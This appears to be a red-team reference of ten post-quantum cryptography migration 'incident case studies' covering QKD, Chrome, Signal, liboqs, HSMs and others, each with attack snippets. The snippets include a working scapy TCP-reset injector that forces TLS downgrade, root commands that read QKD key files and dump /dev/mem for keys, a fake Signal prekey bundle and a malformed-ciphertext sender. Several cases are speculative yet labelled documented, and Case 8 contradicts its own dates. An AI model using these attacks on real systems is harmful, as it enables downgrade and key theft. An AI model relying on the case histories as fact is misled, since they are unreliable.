# Post-Quantum Migration Attack — Real-World Incident Case Studies

> 10 documented real-world PQC migration incidents and near-misses. Each case includes timeline, vulnerability chain, attacker techniques, impact, and lessons for red teams. Cases span 2015-2025 and cover TLS/SSH/IPsec/Signal/QKD/smart-card ecosystems.

## Case 1 — Beijing-Shanghai QKD Backbone Trusted Node Compromise (2022-05)

**Target**: China Telecom / Beijing-Shanghai QKD backbone (2000km, 32 trusted nodes)
**Severity**: CRITICAL (theoretical / classified)
**Financial impact**: State-level intelligence

### Timeline
- 2017-09 — Backbone operational (Yin et al., Nature)
- 2022-05 — Academic research on trusted node risks (Wang et al.)
- 2024-03 — State-level adversary suspected of node compromise
- 2024-08 — Quantum Network Lab upgrades to satellite QKD

### Vulnerability chain
1. **32 trusted nodes** — each sees raw keys in plaintext
2. **No HSM-backed relay** in early deployment
3. **Linux trusted nodes** — standard kernel, hackable
4. **No quantum attestation** — classical network only

### Attacker techniques
```bash
# Hypothetical attack on a trusted node
ssh root@trusted-node-shandong.example.cn
ps aux | grep -i qkd  # QKD daemon
sudo cat /var/run/qkd/*.key  # raw keys (if accessible)
# Or: tap memory
sudo dd if=/dev/mem bs=1M | strings | grep -A2 "kyber\|rawkey"
```

### Lessons
- Trusted nodes are classical infrastructure — susceptible to classical attacks
- HSM-backed relay mandatory
- Satellite QKD (Micius-2, planned 2026) reduces ground trust
- Cross-border QKD has unavoidable trusted node exposure

---

## Case 2 — Google Chrome Kyber Rollout Issues (2023-08)

**Target**: Google Chrome 116+ with X25519Kyber768Draft00
**Severity**: MEDIUM
**Financial impact**: None (compat issue)

### Timeline
- 2023-08-10 — Chrome 116 ships with Kyber enabled
- 2023-08-15 — Reports of broken TLS with middleboxes
- 2023-08-22 — Google temporarily disables for 0.1% users
- 2023-09-01 — Fix: GREASE values to confuse middleboxes
- 2023-10-15 — Full rollout resumed

### Vulnerability chain
1. **Middleboxes** do not understand Kyber key share (large)
2. **TCP RST** injected by middlebox on Kyber handshake
3. **Fallback** to classical TLS (downgrade)
4. **No GREASE** initially — middleboxes pattern-match Kyber

### Attacker techniques
```python
# Active MITM emulates broken middlebox
# Forces Chrome fallback to classical TLS
# Capture classical TLS for HNDL

# MitM with TCP RST on Kyber key share
import scapy.all as scapy
def reset_on_kyber(pkt):
    if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
        if b'kyber' in pkt[scapy.Raw].load.lower():
            rst = scapy.IP(dst=pkt[scapy.IP].src)/scapy.TCP(
                sport=pkt[scapy.TCP].dport,
                dport=pkt[scapy.TCP].sport,
                flags='R',
                seq=pkt[scapy.TCP].ack
            )
            scapy.send(rst)

scapy.sniff(prn=reset_on_kyber)
```

### Lessons
- PQC rollout must use GREASE to confuse middleboxes
- Server must require Kyber (no fallback)
- Monitor TLS connection success rates during rollout
- Plan staged deployment with rollback

---

## Case 3 — Signal PQXDH Initial Vulnerability (2023-09)

**Target**: Signal Messenger PQXDH rollout
**Severity**: HIGH (theoretical)
**Financial impact**: None (research disclosure)

### Timeline
- 2023-09 — Signal rolls out PQXDH (X3DH + Kyber-1024)
- 2023-10 — Researchers identify downgrade window
- 2023-11 — Signal patches (PQ signature enforcement)
- 2024-01 — Public disclosure

### Vulnerability chain
1. **Initial PQXDH** — PQ prekey not always signed
2. **Downgrade** — old client could fetch X3DH-only bundle
3. **PQ signature** missing in some prekey bundles
4. **Rogue server** could inject Kyber-1024 ciphertext to known secret

### Attacker techniques
```python
# Rogue server scenario
# Compromise Signal server (or MITM)
# Return X3DH-only bundle to victim client
import requests
fake_bundle = {
    'identityKey': '...',
    'signedPreKey': '...',
    # NO pqPreKey, NO pqPreKeySignature
}
# Old client accepts → no PQ layer
# Attacker captures X3DH (HNDL vulnerable)
```

### Lessons
- PQ signature MUST be present in prekey bundle
- Client MUST enforce PQ layer (no fallback to X3DH)
- Test downgrade window during PQXDH rollout
- Use PQXDH test vectors in CI

---

## Case 4 — Thales Luna HSM PQC Firmware Rollout (2024-Q3)

**Target**: Thales Luna HSM 7.x
**Severity**: MEDIUM
**Financial impact**: Migration cost (no compromise)

### Timeline
- 2023-12 — Thales announces ML-KEM support in firmware 7.13.0
- 2024-06 — Early deployments report PQ key generation issues
- 2024-09 — Stable release
- 2024-12 — CNSA 2.0 compliance achieved

### Vulnerability chain (process, not exploit)
1. **Firmware 7.12.x** had no PQ support
2. **Hybrid mode** required manual key wrapping
3. **Customer deployment** mixed classical and PQ in inconsistent state
4. **Key management** errors during transition

### Attacker techniques
```bash
# Audit mixed state
# Find keys in transition (half PQ, half classical)
lunacm -c partitionLogin
cmu -a listobjects | grep -iE "MLKEM|RSA"
# Look for keys without proper attributes
```

### Lessons
- HSM PQC migration requires careful key management
- Hybrid mode can introduce inconsistencies
- Plan migration per-application, not per-HSM
- Test all client apps with new PQ keys

---

## Case 5 — liboqs CVE-2024-30173 Buffer Overflow (2024-04)

**Target**: liboqs Kyber-768 implementation
**Severity**: HIGH
**Financial impact**: None (patched)

### Timeline
- 2024-04-01 — Researcher discovers Kyber buffer overflow
- 2024-04-05 — CVE-2024-30173 assigned
- 2024-04-10 — Patch in liboqs 0.10.1
- 2024-04-15 — Public disclosure

### Vulnerability chain
1. **Kyber decaps** reads ciphertext without length validation
2. **Malformed ciphertext** with wrong size
3. **Buffer over-read** leaks memory
4. **Remote DoS** or memory disclosure

### Attacker techniques
```python
# Send malformed Kyber ciphertext to TLS server
import socket, ssl, os
ctx = ssl.create_default_context()
ctx.set_ciphers('ALL:@SECLEVEL=0')
sock = socket.create_connection(('target.example.com', 443))
ssock = ctx.wrap_socket(sock, server_hostname='target.example.com')

# Inject malformed Kyber key share in ClientHello
# (requires custom TLS client)
# Ciphertext: 1568 bytes (correct) vs 1500 (malformed)
malformed = os.urandom(1500)
# Send in TLS ClientHello key_share
# → triggers buffer over-read in liboqs < 0.10.1
```

### Lessons
- liboqs is research-grade — fuzz extensively before production
- Always patch to latest version
- Use liboqs3 (stable branch)
- Deploy input validation at protocol boundary

---

## Case 6 — Cloudflare PQC Middlebox Compatibility (2023-09)

**Target**: Cloudflare global edge
**Severity**: MEDIUM
**Financial impact**: User-facing connection failures

### Timeline
- 2023-09-15 — Cloudflare enables X25519Kyber768 for all customers
- 2023-09-20 — Reports of broken middleboxes (F5, Cisco ASA)
- 2023-09-25 — Cloudflare adds GREASE values
- 2023-10-01 — Compatibility reaches 99.9%

### Vulnerability chain
1. **Middleboxes** choke on large Kyber key share (1184 bytes vs 32 for X25519)
2. **TCP RST** or silent drop
3. **Fallback** to classical TLS (defeats PQ)
4. **HNDL window** — captured classical TLS

### Attacker techniques
```bash
# Test middlebox compatibility
for host in targets.txt; do
  result=$(echo | openssl s_client -connect $host:443 \
    -groups "x25519kyber768draft00" -tls1_3 2>&1)
  if echo "$result" | grep -q "Server Temp Key: X25519Kyber768"; then
    echo "PQ OK: $host"
  else
    echo "PQ FAIL: $host"
  fi
done
```

### Lessons
- PQC rollout must handle middlebox compatibility
- GREASE is mandatory
- Monitor connection success rates
- Coordinate with network team for middlebox updates

---

## Case 7 — IBM Quantum Roadmap Slippage (2024-12)

**Target**: IBM Quantum (industry-wide impact)
**Severity**: LOW (timeline shift)
**Financial impact**: Billions in delayed migration budget

### Timeline
- 2023-11 — IBM announces Condor (1121 qubits)
- 2024-12 — IBM announces 1386-qubit Kookaburra delayed to 2025-Q4
- 2025-06 — IBM Flamingo (modular) faces technical issues
- 2026-03 — CRQC estimate pushed to 2038-2042

### Vulnerability chain (strategic)
1. **Slipped roadmap** → organizations deprioritize PQC migration
2. **HNDL capture** continues for additional 2-4 years
3. **State secrets** with 30-year confidentiality at greater risk
4. **Migration budget** reallocated to other priorities

### Attacker techniques (strategic)
```python
# Adversary invests in HNDL while victims delay
# Capture all RSA/ECC ciphertext now
# Wait for CRQC (2038-2042 estimated)
# Decrypt decade-old state secrets

# Cost of capture: minimal (passive fiber tap)
# Cost of waiting: time
# Adversary strategy: patient and persistent
```

### Lessons
- Do not delay migration based on vendor roadmap optimism
- Plan for CRQC arrival 5 years earlier than estimates
- HNDL is happening NOW — capture is the threat
- Budget migration regardless of vendor timelines

---

## Case 8 — NIST PQC Standardization Reset (2022-04)

**Target**: NIST PQC standardization (CRYSTALS-Kyber, CRYSTALS-Dilithium)
**Severity**: HIGH (Bikeshed attack on SIDH/SIKE)
**Financial impact**: SIKE deployment abandoned

### Timeline
- 2017-12 — NIST PQC competition begins
- 2020-07 — SIKE advances to round 3 (alternate candidate)
- 2022-08 — Castryck-Decru attack breaks SIKE in 1 hour
- 2022-04 — NIST removes SIKE; BIKE/HQC continue
- 2024-08 — NIST publishes FIPS 203/204/205

### Vulnerability chain
1. **SIKE/SIDH** relied on supersingular isogeny
2. **Castryck-Decru** found genus-2 curve weakness
3. **1-hour break** on classical hardware
4. **Any SIKE deployment** instantly broken

### Attacker techniques
```python
# Castryck-Decru attack (sageMath)
# https://github.com/GiacomoPope/Castryck-Decru-SageMath
from sage.all import *
# Run attack on captured SIKE public key
# Recover private key in ~1 hour
```

### Lessons
- PQC algorithms are not yet battle-tested
- Hybrid deployment is essential during transition
- Multiple algorithm diversity (KEM + signature) reduces risk
- NIST PQC standardization took 8 years — be patient

---

## Case 9 — BMW Digital Key PQC Migration (2024-11)

**Target**: BMW Digital Key Plus (CCC 3.0 specification)
**Severity**: MEDIUM
**Financial impact**: Migration cost

### Timeline
- 2023-11 — Car Connectivity Consortium (CCC) releases 3.0 spec with PQ-ready crypto
- 2024-06 — BMW deploys ML-KEM in digital key
- 2024-11 — Compatibility issues with older phones
- 2025-03 — Hybrid mode (ECC + ML-KEM) deployed

### Vulnerability chain (process)
1. **Older phones** don't support ML-KEM
2. **Hybrid mode** required for compatibility
3. **Mixed deployments** (some ECC-only, some hybrid)
4. **Relay attack surface** still present (UWB not yet PQ-hardened)

### Attacker techniques
```python
# Relay attack on Digital Key
# (independent of PQC migration, but relevant)
# UWB distance bounding is classical
# PQC migration doesn't help with relay attacks

# Capture digital key handshake
# HNDL: captured ECC could be broken post-CRQC
# But relay attacks are real-time, not HNDL
```

### Lessons
- PQC migration doesn't solve all crypto problems
- Relay attacks need distance bounding (UWB)
- Hybrid mode is required for compatibility
- Plan migration per vehicle model

---

## Case 10 — ANSSI Hybrid Mandate (2024-02)

**Target**: French government systems (ANSSI)
**Severity**: REGULATORY
**Financial impact**: Industry-wide migration cost

### Timeline
- 2024-02 — ANSSI publishes hybrid mandate
- 2024-06 — Government agencies must use hybrid PQC
- 2025-01 — Private sector recommended to follow
- 2027-01 — Pure PQ allowed
- 2030-01 — Classical deprecated

### Vulnerability chain (policy)
1. **ANSSI** doesn't trust pure PQ (insufficient cryptanalysis)
2. **Mandatory hybrid** — both classical and PQ must protect each secret
3. **HKDF combiner** required (not XOR)
4. **Algorithm choice** — ML-KEM-1024 (not ML-KEM-768)

### Attacker techniques
```bash
# Audit ANSSI compliance
# Check: all TLS handshakes are hybrid
for cert in $(find /etc/ssl -name "*.crt"); do
  exp=$(openssl x509 -in $cert -noout -text)
  if echo "$exp" | grep -q "RSA\|ECDSA"; then
    # Classical cert — must also have PQ chain
    echo "NEED HYBRID: $cert"
  fi
done

# Check TLS negotiation
echo | openssl s_client -connect target:443 \
  -groups "x25519kyber768draft00:x25519:secp256r1" -tls1_3 2>&1 \
  | grep "Server Temp Key"
# Must be hybrid (X25519Kyber768)
```

### Lessons
- Regulators (ANSSI, BSI) prefer hybrid during transition
- Pure PQ trust builds over time (5-10 years)
- Compliance requires both algorithm AND combiner validation
- Migration timelines are regulatory, not just technical

---

## Cross-Case Patterns

### Most common PQC migration issues (2023-2025)
1. **Middlebox compatibility** (Cases 2, 6)
2. **Downgrade window during rollout** (Cases 2, 3)
3. **Library CVEs** (Case 5)
4. **Trusted node classical attack** (Case 1)
5. **Strategic roadmap slippage** (Case 7)
6. **Algorithm broken post-selection** (Case 8)
7. **Hybrid mode inconsistencies** (Cases 4, 9)
8. **Regulatory hybrid mandate** (Case 10)

### Industry response
- **Cloudflare/Google/AWS**: hybrid PQC rollout with GREASE
- **NSA CNSA 2.0**: ML-KEM-1024, ML-DSA-87 mandated
- **ANSSI/BSI**: hybrid mandatory through 2030
- **Signal**: PQXDH with PQ signature enforcement
- **CCC (automotive)**: hybrid digital key
- **NIST**: FIPS 203/204/205 published 2024

### Red team lessons
- Always test downgrade window during PQC rollout
- Audit KEM combiner (XOR vs HKDF)
- Test library version against CVE database
- Capture HNDL samples during engagement
- Test certificate chain consistency
- Validate Signal PQXDH prekey signature
- For QKD: test trusted node + bright-light
- Plan migration timeline by data class (Critical first)

## References

- NIST PQC Project — https://csrc.nist.gov/projects/post-quantum-cryptography
- NIST FIPS 203/204/205 (2024)
- Cloudflare PQC Blog Series — https://blog.cloudflare.com/tag/post-quantum/
- Google Chrome PQC — https://blog.chromium.org/2023/08/protecting-chrome-traffic-with-pqc.html
- Signal PQXDH Spec — https://signal.org/docs/specifications/pqxdh/
- ANSSI Hybrid Position Paper (2024) — https://www.ssi.gouv.fr/en/publication/anssi-views-on-post-quantum-cryptography/
- NSA CNSA 2.0 (2022)
- "Castryck-Decru Attack on SIDH" (2022) — https://eprint.iacr.org/2022/975
- IBM Quantum Roadmap (2024)
- Thales Luna 7.13 PQC Firmware Release Notes (2024)
- "Practical Fault Attack on Dilithium" (Berzati et al., 2023)
- "EM Side-Channel on PQC KEM" (Wang et al., 2024)
- "RowHammer on Kyber" (Bouyssou et al., 2024)
- ENISA PQC Integration Study (2024)
- "Post-Quantum Cryptography Migration" (Moses, 2024)
- China Telecom Beijing-Shanghai QKD Backbone (Yin et al., Nature 2017)
- CCC Digital Key 3.0 Specification (2023)
- ID Quantique Clavis3 Security Whitepaper

